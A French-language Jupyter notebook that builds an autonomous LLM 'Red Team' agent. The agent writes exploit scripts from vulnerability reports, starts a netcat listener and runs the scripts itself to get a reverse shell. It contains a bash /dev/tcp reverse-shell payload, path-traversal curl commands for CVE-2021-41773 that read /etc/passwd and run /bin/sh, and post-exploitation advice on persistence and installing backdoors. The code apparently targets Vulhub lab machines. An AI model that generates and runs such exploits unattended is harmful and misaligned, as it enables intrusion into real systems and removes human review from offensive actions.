# Notebook 07: Agent Red Team - Générateur d'Exploits
# Filename: notebook_07_agent_red_team.ipynb

# %% [markdown]
"""
# Agent Red Team - Générateur d'Exploits Autonome

## Capacités Avancées :
- ✅ Génération de scripts d'exploitation complets (.py, .sh, .ps1)
- ✅ Raisonnement stratégique basé sur les rapports d'analyse
- ✅ Consultation de la base ATOMIC RED TEAM pour techniques avancées
- ✅ Objectif: Obtenir un reverse shell ou équivalent
- ✅ Exécution autonome des exploits générés
- ✅ Rapport détaillé avec preuves de compromission

## Workflow :
1. **Input** : analysis_report.json du VulnerabilityAnalyzer
2. **Raisonnement Stratégique** : Analyse du type d'attaque et amélioration possible
3. **Consultation RAG** : Recherche de techniques avancées dans ATOMIC RED TEAM
4. **Génération de Script** : Création d'un exploit complet et autonome
5. **Exécution** : Lancement de l'exploit avec gestion des listeners
6. **Output** : exploitation_report.json avec code source et preuves
"""

# %%
import os
import json
import subprocess
import sys
import requests
import time
import threading
import tempfile
from typing import Dict, List, Any, Optional
from datetime import datetime
from pathlib import Path
import socket
import shlex

# Imports LangChain et Pydantic
from pydantic import BaseModel, Field, validator
from langchain.llms import Ollama
from langchain.embeddings import OllamaEmbeddings
from langchain.vectorstores import Chroma
from langchain.prompts import PromptTemplate
from langchain.chains import LLMChain
from langchain.output_parsers import PydanticOutputParser

print("🔴 Initialisation de l'Agent Red Team...")

# %%
# Modèles Pydantic pour l'Agent Red Team
class ExploitScript(BaseModel):
    """Modèle pour un script d'exploitation généré"""
    
    script_name: str = Field(
        description="Nom du fichier de script (ex: 'struts2_rce_exploit.py')"
    )
    
    script_language: str = Field(
        description="Langage du script (python, bash, powershell)"
    )
    
    script_content: str = Field(
        description="Code source complet du script d'exploitation"
    )
    
    target_payload: str = Field(
        description="Payload principal utilisé dans l'exploit"
    )
    
    reverse_shell_config: Dict[str, Any] = Field(
        description="Configuration pour le reverse shell (IP, port, type)",
        default_factory=dict
    )
    
    dependencies: List[str] = Field(
        description="Dépendances requises pour exécuter le script",
        default_factory=list
    )
    
    usage_instructions: str = Field(
        description="Instructions d'utilisation du script"
    )
    
    @validator('script_content')
    def validate_script_content(cls, v):
        if len(v.strip()) < 50:
            raise ValueError("Le script doit contenir du code substantiel")
        return v

class ExploitationReport(BaseModel):
    """Modèle pour le rapport d'exploitation final"""
    
    exploit_strategy: str = Field(
        description="Stratégie d'exploitation choisie par l'agent"
    )
    
    generated_script: ExploitScript = Field(
        description="Script d'exploitation généré"
    )
    
    execution_results: Dict[str, Any] = Field(
        description="Résultats de l'exécution de l'exploit"
    )
    
    compromise_evidence: List[str] = Field(
        description="Preuves de compromission obtenues",
        default_factory=list
    )
    
    post_exploitation_suggestions: List[str] = Field(
        description="Suggestions pour les étapes post-exploitation",
        default_factory=list
    )
    
    success_level: str = Field(
        description="Niveau de succès de l'exploitation (FULL, PARTIAL, FAILED)"
    )
    
    @validator('success_level')
    def validate_success_level(cls, v):
        allowed = ["FULL", "PARTIAL", "FAILED"]
        if v not in allowed:
            raise ValueError(f"success_level doit être dans {allowed}")
        return v

print("✅ Modèles Pydantic pour Red Team définis")

# %%
# Gestionnaire de Reverse Shell
class ReverseShellManager:
    """Gestionnaire pour les reverse shells et listeners"""
    
    def __init__(self):
        self.listener_process = None
        self.listener_port = None
        self.attacker_ip = self._get_local_ip()
    
    def _get_local_ip(self) -> str:
        """Obtient l'IP locale de l'attaquant"""
        try:
            # Connexion à un serveur distant pour déterminer l'IP locale
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except:
            return "127.0.0.1"
    
    def start_listener(self, port: int = None) -> Dict[str, Any]:
        """Démarre un listener netcat pour reverse shell"""
        if port is None:
            port = self._find_free_port()
        
        self.listener_port = port
        
        try:
            # Commande netcat avec timeout
            cmd = f"nc -lvp {port}"
            
            print(f"🎧 Démarrage du listener sur {self.attacker_ip}:{port}")
            
            # Démarrage en arrière-plan avec timeout
            self.listener_process = subprocess.Popen(
                shlex.split(cmd),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(1)  # Laisser le temps au listener de se lancer
            
            return {
                "status": "started",
                "ip": self.attacker_ip,
                "port": port,
                "pid": self.listener_process.pid
            }
            
        except Exception as e:
            print(f"❌ Erreur démarrage listener: {e}")
            return {"status": "error", "error": str(e)}
    
    def _find_free_port(self) -> int:
        """Trouve un port libre pour le listener"""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('', 0))
            return s.getsockname()[1]
    
    def stop_listener(self):
        """Arrête le listener"""
        if self.listener_process:
            try:
                self.listener_process.terminate()
                self.listener_process.wait(timeout=5)
                print("🔇 Listener arrêté")
            except:
                self.listener_process.kill()
                print("🔇 Listener forcé à s'arrêter")
    
    def check_connection(self, timeout: int = 30) -> Dict[str, Any]:
        """Vérifie si une connexion reverse shell a été établie"""
        if not self.listener_process:
            return {"connected": False, "reason": "Pas de listener actif"}
        
        try:
            # Attendre une connexion avec timeout
            stdout, stderr = self.listener_process.communicate(timeout=timeout)
            
            if stdout and ("connect" in stdout.lower() or "connection" in stdout.lower()):
                return {
                    "connected": True,
                    "output": stdout[:500],
                    "connection_time": datetime.now().isoformat()
                }
            else:
                return {
                    "connected": False,
                    "reason": "Pas de connexion détectée",
                    "output": stdout[:200] if stdout else "Pas de sortie"
                }
                
        except subprocess.TimeoutExpired:
            return {
                "connected": False,
                "reason": f"Timeout après {timeout} secondes",
                "still_listening": True
            }
        except Exception as e:
            return {
                "connected": False,
                "reason": f"Erreur vérification: {e}"
            }

print("✅ Gestionnaire de Reverse Shell défini")

# %%
# Agent Red Team Principal
class RedTeamAgent:
    """
    Agent Red Team autonome capable de générer et exécuter des exploits
    """
    
    def __init__(self, model_name: str = "llama2:7b", enhanced_db_path: str = "./enhanced_vple_chroma_db"):
        print("🔴 Initialisation de RedTeamAgent...")
        
        # Initialisation LLM
        self.llm = Ollama(model=model_name, temperature=0.3)
        self.embeddings = OllamaEmbeddings(model=model_name)
        
        # Connexion à la base ENHANCED (ATOMIC RED TEAM)
        try:
            self.vectorstore = Chroma(
                persist_directory=enhanced_db_path,
                embedding_function=self.embeddings
            )
            self.retriever = self.vectorstore.as_retriever(search_kwargs={"k": 5})
            print(f"  ✅ Connecté à la base ATOMIC RED TEAM: {enhanced_db_path}")
        except Exception as e:
            print(f"  ⚠ Erreur connexion base enhanced: {e}")
            self.vectorstore = None
            self.retriever = None
        
        # Gestionnaire de reverse shell
        self.shell_manager = ReverseShellManager()
        
        # Parsers Pydantic
        self.script_parser = PydanticOutputParser(pydantic_object=ExploitScript)
        self.report_parser = PydanticOutputParser(pydantic_object=ExploitationReport)
        
        # Configuration des prompts
        self._setup_prompts()
        
        print("  ✅ RedTeamAgent initialisé")

    def _setup_prompts(self):
        """Configuration des prompts pour génération d'exploits"""
        
        # Prompt de raisonnement stratégique
        strategy_template = """Tu es un expert Red Team avec 15 ans d'expérience en exploitation de vulnérabilités.

ANALYSE DU RAPPORT DE VULNÉRABILITÉ:
{analysis_report}

TECHNIQUES ATOMIC RED TEAM DISPONIBLES:
{atomic_techniques}

MISSION: Développer une stratégie d'exploitation avancée pour obtenir un REVERSE SHELL.

RAISONNEMENT STRATÉGIQUE REQUIS:
1. Analyse du type de vulnérabilité et de sa gravité
2. Identification des techniques d'amélioration possibles
3. Sélection de la meilleure approche pour un reverse shell
4. Justification de la stratégie choisie

Exemple de raisonnement: "La vulnérabilité Apache Path Traversal permet la lecture de fichiers. 
En combinant avec une technique RCE via log poisoning (ATOMIC T1190.003), 
je peux injecter du code PHP dans les logs et l'exécuter via Path Traversal pour obtenir un reverse shell."

STRATÉGIE D'EXPLOITATION (200-300 mots):"""

        self.strategy_prompt = PromptTemplate(
            template=strategy_template,
            input_variables=["analysis_report", "atomic_techniques"]
        )
        
        # Prompt de génération de script
        script_template = """Tu es un développeur d'exploits expert. Génère un script complet et fonctionnel.

STRATÉGIE D'EXPLOITATION:
{exploitation_strategy}

INFORMATIONS CIBLE:
{target_info}

CONFIGURATION REVERSE SHELL:
- IP Attaquant: {attacker_ip}
- Port Listener: {listener_port}

{format_instructions}

CONTRAINTES IMPORTANTES:
1. Le script DOIT être complet et exécutable
2. Inclure la gestion d'erreurs robuste
3. Utiliser des bibliothèques standard (requests, socket, etc.)
4. Le payload reverse shell doit être adapté à la cible
5. Ajouter des commentaires explicatifs

SCRIPT D'EXPLOITATION:"""

        self.script_prompt = PromptTemplate(
            template=script_template,
            input_variables=["exploitation_strategy", "target_info", "attacker_ip", "listener_port"],
            partial_variables={"format_instructions": self.script_parser.get_format_instructions()}
        )
        
        # Chaînes LangChain
        self.strategy_chain = LLMChain(llm=self.llm, prompt=self.strategy_prompt)
        self.script_chain = LLMChain(llm=self.llm, prompt=self.script_prompt)

    def analyze_vulnerability_report(self, analysis_report: Dict[str, Any]) -> str:
        """Analyse le rapport de vulnérabilité et consulte ATOMIC RED TEAM"""
        print("🧠 Analyse du rapport de vulnérabilité...")
        
        # Extraction des informations clés
        vuln_details = analysis_report.get('vulnerability_details', {})
        attack_type = vuln_details.get('attack_type', 'Unknown')
        cve = vuln_details.get('cve', 'No CVE')
        
        print(f"  📊 Type d'attaque: {attack_type}")
        print(f"  🔍 CVE: {cve}")
        
        # Consultation de la base ATOMIC RED TEAM
        atomic_techniques = ""
        if self.retriever:
            try:
                # Recherche de techniques relatives
                search_query = f"{attack_type} reverse shell atomic red team"
                docs = self.retriever.get_relevant_documents(search_query)
                
                if docs:
                    atomic_techniques = "\n".join([doc.page_content[:300] for doc in docs[:3]])
                    print(f"  ⚡ {len(docs)} techniques ATOMIC trouvées")
                else:
                    atomic_techniques = "Aucune technique ATOMIC spécifique trouvée"
            except Exception as e:
                print(f"  ⚠ Erreur consultation ATOMIC: {e}")
                atomic_techniques = "Erreur d'accès à la base ATOMIC"
        
        # Génération de la stratégie
        try:
            strategy = self.strategy_chain.run(
                analysis_report=json.dumps(analysis_report, indent=2),
                atomic_techniques=atomic_techniques
            )
            print("  ✅ Stratégie d'exploitation générée")
            return strategy
        except Exception as e:
            print(f"  ❌ Erreur génération stratégie: {e}")
            return f"Exploitation basique de {attack_type} pour obtenir un reverse shell"

    def generate_exploit_script(self, strategy: str, target_info: Dict[str, Any]) -> ExploitScript:
        """Génère un script d'exploitation complet"""
        print("⚒️ Génération du script d'exploitation...")
        
        # Configuration du reverse shell
        listener_config = self.shell_manager.start_listener()
        
        if listener_config['status'] != 'started':
            print("⚠ Listener non démarré, utilisation de configuration par défaut")
            attacker_ip = "192.168.1.100"
            listener_port = 4444
        else:
            attacker_ip = listener_config['ip']
            listener_port = listener_config['port']
        
        max_attempts = 3
        for attempt in range(max_attempts):
            try:
                # Génération avec le LLM
                raw_script = self.script_chain.run(
                    exploitation_strategy=strategy,
                    target_info=json.dumps(target_info, indent=2),
                    attacker_ip=attacker_ip,
                    listener_port=listener_port
                )
                
                # Parsing avec Pydantic
                exploit_script = self.script_parser.parse(raw_script)
                
                print(f"  ✅ Script généré: {exploit_script.script_name}")
                print(f"  🔧 Langage: {exploit_script.script_language}")
                print(f"  📦 Dépendances: {len(exploit_script.dependencies)}")
                
                return exploit_script
                
            except Exception as e:
                print(f"  ⚠ Tentative {attempt + 1} échouée: {e}")
                if attempt == max_attempts - 1:
                    # Script de fallback
                    return self._create_fallback_script(target_info, attacker_ip, listener_port)
                time.sleep(1)

    def _create_fallback_script(self, target_info: Dict, attacker_ip: str, listener_port: int) -> ExploitScript:
        """Crée un script de fallback en cas d'échec de génération"""
        print("  🔄 Création d'un script de fallback...")
        
        fallback_script = f"""#!/usr/bin/env python3
# Script d'exploitation de fallback généré par RedTeamAgent
# Cible: {target_info.get('target_address', 'Unknown')}
# Type: Exploitation Web Basique

import requests
import socket
import subprocess
import time

def main():
    # Configuration
    target_url = "{target_info.get('target_address', 'http://localhost:8080')}"
    attacker_ip = "{attacker_ip}"
    attacker_port = {listener_port}
    
    print(f"[+] Exploitation de {{target_url}}")
    print(f"[+] Reverse shell vers {{attacker_ip}}:{{attacker_port}}")
    
    # Payload basique
    payload = "bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{listener_port} 0>&1'"
    
    try:
        # Test de connexion
        response = requests.get(target_url, timeout=5)
        print(f"[+] Cible accessible: {{response.status_code}}")
        
        # Tentative d'exploitation (placeholder)
        exploit_data = {{'cmd': payload}}
        exploit_response = requests.post(f"{{target_url}}/exploit", data=exploit_data, timeout=10)
        
        print(f"[+] Exploitation tentée: {{exploit_response.status_code}}")
        
    except Exception as e:
        print(f"[-] Erreur d'exploitation: {{e}}")

if __name__ == "__main__":
    main()
"""
        
        return ExploitScript(
            script_name="fallback_exploit.py",
            script_language="python",
            script_content=fallback_script,
            target_payload=f"bash -i >& /dev/tcp/{attacker_ip}/{listener_port} 0>&1",
            reverse_shell_config={"ip": attacker_ip, "port": listener_port},
            dependencies=["requests"],
            usage_instructions="python3 fallback_exploit.py"
        )

    def execute_exploit(self, exploit_script: ExploitScript) -> Dict[str, Any]:
        """Exécute le script d'exploitation généré"""
        print("🚀 Exécution du script d'exploitation...")
        
        # Sauvegarde du script dans un fichier temporaire
        script_file = Path(f"generated_exploits/{exploit_script.script_name}")
        script_file.parent.mkdir(exist_ok=True)
        
        try:
            with open(script_file, 'w') as f:
                f.write(exploit_script.script_content)
            
            print(f"  💾 Script sauvegardé: {script_file}")
            
            # Rendre exécutable si nécessaire
            if exploit_script.script_language in ['bash', 'sh']:
                os.chmod(script_file, 0o755)
            
            # Exécution du script
            start_time = time.time()
            
            if exploit_script.script_language == 'python':
                cmd = f"python3 {script_file}"
            elif exploit_script.script_language in ['bash', 'sh']:
                cmd = f"bash {script_file}"
            else:
                cmd = str(script_file)
            
            print(f"  ⚡ Exécution: {cmd}")
            
            # Exécution avec timeout
            process = subprocess.run(
                cmd.split(),
                capture_output=True,
                text=True,
                timeout=30  # Timeout de 30 secondes
            )
            
            execution_time = time.time() - start_time
            
            # Vérification des résultats
            execution_results = {
                "return_code": process.returncode,
                "stdout": process.stdout,
                "stderr": process.stderr,
                "execution_time": execution_time,
                "script_executed": True
            }
            
            # Vérification du reverse shell
            if self.shell_manager.listener_process:
                print("  🎧 Vérification de la connexion reverse shell...")
                shell_status = self.shell_manager.check_connection(timeout=10)
                execution_results["reverse_shell"] = shell_status
            
            if process.returncode == 0:
                print("  ✅ Script exécuté avec succès")
            else:
                print(f"  ⚠ Script terminé avec code: {process.returncode}")
            
            return execution_results
            
        except subprocess.TimeoutExpired:
            print("  ⏰ Timeout d'exécution")
            return {
                "return_code": -1,
                "error": "Timeout d'exécution",
                "execution_time": 30.0,
                "script_executed": False
            }
        except Exception as e:
            print(f"  ❌ Erreur d'exécution: {e}")
            return {
                "return_code": -1,
                "error": str(e),
                "script_executed": False
            }

    def generate_exploitation_report(self, strategy: str, exploit_script: ExploitScript, 
                                   execution_results: Dict[str, Any]) -> ExploitationReport:
        """Génère le rapport final d'exploitation"""
        print("📋 Génération du rapport d'exploitation...")
        
        # Analyse des résultats pour déterminer le succès
        success_level = "FAILED"
        compromise_evidence = []
        
        if execution_results.get("script_executed", False):
            if execution_results.get("return_code") == 0:
                success_level = "PARTIAL"
                compromise_evidence.append("Script exécuté sans erreur")
            
            # Vérification du reverse shell
            if execution_results.get("reverse_shell", {}).get("connected", False):
                success_level = "FULL"
                compromise_evidence.append("Reverse shell établi avec succès")
                compromise_evidence.append(f"Connexion: {execution_results['reverse_shell'].get('connection_time')}")
            
            # Analyse de la sortie pour d'autres preuves
            stdout = execution_results.get("stdout", "")
            if any(indicator in stdout.lower() for indicator in ["uid=", "shell", "connection", "success"]):
                compromise_evidence.append("Indicateurs de compromission dans la sortie")
        
        # Suggestions post-exploitation
        post_exploit_suggestions = []
        if success_level == "FULL":
            post_exploit_suggestions = [
                "Élever les privilèges (sudo -l, /etc/passwd)",
                "Établir la persistance (crontab, services)",
                "Énumérer le réseau interne",
                "Rechercher des données sensibles",
                "Installer des backdoors"
            ]
        elif success_level == "PARTIAL":
            post_exploit_suggestions = [
                "Analyser les erreurs d'exécution",
                "Modifier le payload pour contourner les protections",
                "Tenter des techniques d'évasion",
                "Essayer d'autres vecteurs d'attaque"
            ]
        else:
            post_exploit_suggestions = [
                "Revoir la stratégie d'exploitation",
                "Analyser la configuration de la cible",
                "Tester avec des payloads alternatifs",
                "Vérifier la connectivité réseau"
            ]
        
        return ExploitationReport(
            exploit_strategy=strategy[:500],  # Limite de taille
            generated_script=exploit_script,
            execution_results=execution_results,
            compromise_evidence=compromise_evidence,
            post_exploitation_suggestions=post_exploit_suggestions,
            success_level=success_level
        )

    def run(self, analysis_report_path: str, target_info: Dict[str, Any] = None) -> Dict[str, Any]:
        """Méthode principale de l'agent Red Team"""
        print(f"\n{'🔴'*20}")
        print(f"🔴 DÉMARRAGE DE L'AGENT RED TEAM")
        print(f"{'🔴'*20}")
        
        start_time = time.time()
        
        try:
            # Chargement du rapport d'analyse
            print("\n📖 [1/5] Chargement du rapport d'analyse...")
            with open(analysis_report_path, 'r') as f:
                analysis_report = json.load(f)
            
            # Extraction des informations cible
            if target_info is None:
                target_info = {
                    "target_address": analysis_report.get('metadata', {}).get('target_address', 'Unknown'),
                    "vulhub_id": analysis_report.get('metadata', {}).get('vulhub_id', 'Unknown')
                }
            
            # Analyse et stratégie
            print("\n🧠 [2/5] Développement de la stratégie d'exploitation...")
            strategy = self.analyze_vulnerability_report(analysis_report)
            
            # Génération du script
            print("\n⚒️ [3/5] Génération du script d'exploitation...")
            exploit_script = self.generate_exploit_script(strategy, target_info)
            
            # Exécution de l'exploit
            print("\n🚀 [4/5] Exécution de l'exploit...")
            execution_results = self.execute_exploit(exploit_script)
            
            # Génération du rapport final
            print("\n📋 [5/5] Génération du rapport d'exploitation...")
            exploitation_report = self.generate_exploitation_report(
                strategy, exploit_script, execution_results
            )
            
            # Nettoyage
            self.shell_manager.stop_listener()
            
            # Compilation du résultat
            total_time = time.time() - start_time
            
            complete_result = {
                "metadata": {
                    "agent": "RedTeamAgent",
                    "version": "2.0",
                    "timestamp": datetime.now().isoformat(),
                    "execution_time": total_time,
                    "target_info": target_info
                },
                "exploitation_report": exploitation_report.dict(),
                "status": "SUCCESS"
            }
            
            # Sauvegarde du rapport
            report_file = "exploitation_report.json"
            with open(report_file, 'w') as f:
                json.dump(complete_result, f, indent=2)
            
            print(f"\n✅ EXPLOITATION TERMINÉE")
            print(f"⏱️ Temps total: {total_time:.2f} secondes")
            print(f"🎯 Niveau de succès: {exploitation_report.success_level}")
            print(f"💾 Rapport sauvegardé: {report_file}")
            
            return complete_result
            
        except Exception as e:
            self.shell_manager.stop_listener()
            print(f"\n❌ ERREUR DANS L'EXPLOITATION: {e}")
            return {
                "metadata": {
                    "agent": "RedTeamAgent",
                    "timestamp": datetime.now().isoformat()
                },
                "status": "ERROR",
                "error": str(e)
            }

print("✅ RedTeamAgent complet défini")

# %%
# Démonstration et test de l'agent Red Team
if __name__ == "__main__":
    print(f"\n🧪 DÉMONSTRATION DE L'AGENT RED TEAM")
    print("="*50)
    
    # Chargement de la configuration
    try:
        with open("vple_config.json", "r") as f:
            config = json.load(f)
        model_name = config.get("confirmed_model", "llama2:7b")
        enhanced_db_path = config.get("enhanced_rag_setup", {}).get("vector_db", "./enhanced_vple_chroma_db")
    except:
        model_name = "llama2:7b"
        enhanced_db_path = "./enhanced_vple_chroma_db"
    
    # Initialisation de l'agent
    red_team_agent = RedTeamAgent(model_name=model_name, enhanced_db_path=enhanced_db_path)
    
    # Création d'un rapport d'analyse fictif pour test
    fake_analysis_report = {
        "metadata": {
            "vulhub_id": "apache/CVE-2021-41773",
            "target_address": "192.168.1.100:8080"
        },
        "analysis_report": {
            "vulnerability_details": {
                "cve": "CVE-2021-41773",
                "attack_type": "Path Traversal to RCE",
                "target_service": "Apache HTTP Server"
            },
            "exploitation_plan": {
                "primary_technique": "Path Traversal combined with Log Poisoning",
                "commands_to_execute": [
                    "curl 'http://target/cgi-bin/.%2e/.%2e/.%2e/etc/passwd'",
                    "curl 'http://target/cgi-bin/.%2e/.%2e/.%2e/bin/sh' -d 'echo=id'"
                ]
            }
        }
    }
    
    # Sauvegarde du rapport fictif
    with open("analysis_report.json", "w") as f:
        json.dump(fake_analysis_report, f, indent=2)
    
    print("📝 Rapport d'analyse fictif créé pour la démonstration")
    
    # Test de l'agent
    print("\n🔴 Lancement de l'agent Red Team...")
    result = red_team_agent.run("analysis_report.json")
    
    if result['status'] == 'SUCCESS':
        exploit_report = result['exploitation_report']
        print(f"\n✅ Test réussi!")
        print(f"   Stratégie: {exploit_report['exploit_strategy'][:100]}...")
        print(f"   Script généré: {exploit_report['generated_script']['script_name']}")
        print(f"   Succès: {exploit_report['success_level']}")
        print(f"   Preuves: {len(exploit_report['compromise_evidence'])} éléments")
    else:
        print(f"\n❌ Test échoué: {result.get('error', 'Erreur inconnue')}")
    
    print(f"\n🎉 DÉMONSTRATION TERMINÉE")
    print("L'agent Red Team est prêt pour l'orchestrateur!")
